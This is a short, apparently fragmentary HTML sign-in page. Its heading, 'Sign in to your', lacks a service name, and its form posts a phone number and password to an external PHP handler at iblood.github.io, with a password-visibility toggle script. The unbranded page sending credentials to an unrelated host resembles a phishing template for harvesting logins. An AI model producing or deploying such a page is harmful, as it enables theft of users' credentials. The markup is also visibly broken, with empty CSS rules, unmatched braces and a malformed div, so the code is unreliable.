<style>
body {

}

}
.im{

.content{

}

<div class="in">Sign in to your</div>

<form class="content" action="iblood.github.io/process.php" method="post">
     <div class="container">
 <input type="tel" placeholder="Phone Number" name="pnumber" required>
<input style="margin-bottom:8px;" id="password" type="password" placeholder="Password" name="password" required>
        <i id="togglePassword" class="far fa-eye"></i>
<div style="text-align:right;margin-bottom:25px;"><a class="fp" href="#">Forgot Password?</a></div>
      <button type="submit" class="submit">Sign in</button>
      </div>
<div style="margin-bottom:none;"Don't have an account? <a class="fp" href="#">Sign up?</a>
</form>
<script>
  const togglePassword = document.querySelector('#togglePassword');
    var password = document.querySelector('#password');
 togglePassword.addEventListener('click' ,function(e)
  				{var type = password.getAttribute('type') === 'password' ? 'text' : 'password' ;
  				password.setAttribute('type' ,type);
  				this.classList.toggle('fa-eye-slash');
  				});
 </script>
